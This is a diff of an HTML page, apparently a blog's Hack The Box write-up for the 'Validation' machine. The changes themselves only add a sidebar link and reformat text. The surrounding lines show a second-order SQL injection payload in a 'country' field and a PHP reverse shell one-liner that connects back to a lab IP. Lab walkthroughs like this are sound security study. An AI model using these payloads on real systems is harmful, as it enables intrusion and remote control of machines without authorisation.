@@ -72,6 +72,28 @@
                                 <a href="#" class="headerlink" title="Categories"></a>
                                 Categories
                             </h2>
+                            <h2 id="Notes">
+                                <a href="#" class="headerlink" title="Notes"></a>
+                                Notes
+                            </h2>
+                            <ul>
+                                <li>
+                                    <details class="accordion">
+                                        <summary class="accordion-header">
+                                            <i class="icon icon-arrow-right mr-1"></i>
+                                            Tools
+                                        </summary>
+                                        <div class="accordion-body">
+                                            <!-- Accordions content -->
+                                            <ul>
+                                                <li>
+                                                    <a href="/Notes/Tools/grep.html">Grep</a>
+                                                </li>
+                                            </ul>
+                                        </div>
+                                    </details>
+                                </li>
+                            </ul>
                             <h2 id="Hack-The-Box-Write-ups">
                                 <a href="#" class="headerlink" title="Hack The Box Write-ups"></a>
                                 HTB Write-ups
@@ -174,8 +196,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</pre>
                             <p>Let's try for SQL injection here.</p>
                             <p>Maybe we can get some interesting info from the database.</p>
                             <img src="/htb/Validation/3.png" alt="first SQL attempt">
-                            <p>Looks like a failed SQL injection, whole of the query statement got taken in as the input</p>
-                                <p>That is nothing escaped the input field.</p>
+                            <p>Looks like a failed SQL injection, whole of the query statement got taken in as the input
+                            </p>
+                            <p>That is nothing escaped the input field.</p>
                             <h3 id="burp">Intercepting request with burpsuite</h3>
                             <img src="/htb/Validation/4.png" alt="Burp request">
                             <p>Intersepting the POST request in buptsuit we can see the "country" input we can meddle
@@ -187,7 +210,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</pre>
 </pre>
                                 </div>
                             </div>
-                            <p>It's a hit,</p> 
+                            <p>It's a hit,</p>
                             <p>The error message indicates a second order SQL injection.</p>
                             <img src="/htb/Validation/5.png" alt="tried for SQL injection in country input">
                             <p>The input is being stored and when used, is not being parsed properly.</p>
@@ -270,10 +293,11 @@ username=utkc2&country=Algeria' UNION SELECT user() #
                             <div class="card s-rounded code-card">
                                 <div class="card-body">
                                     <!-- change the special chars -->
-                                    <pre class="code-p">?cmd=php -r '$sock=fsockopen("10.10.14.20",4444);exec("/bin/sh -i &lt;&3 >&3 2>&3");'</pre>
+                                    <pre
+                                        class="code-p">?cmd=php -r '$sock=fsockopen("10.10.14.20",4444);exec("/bin/sh -i &lt;&3 >&3 2>&3");'</pre>
                                 </div>
                             </div>
-                            
+
                             <img src="/htb/Validation/12.png" alt="reverse shell cought on netcat">
                             <p>And we got ourselves a revershe shell.</p>
                             <p>Let's get the user flag</p>
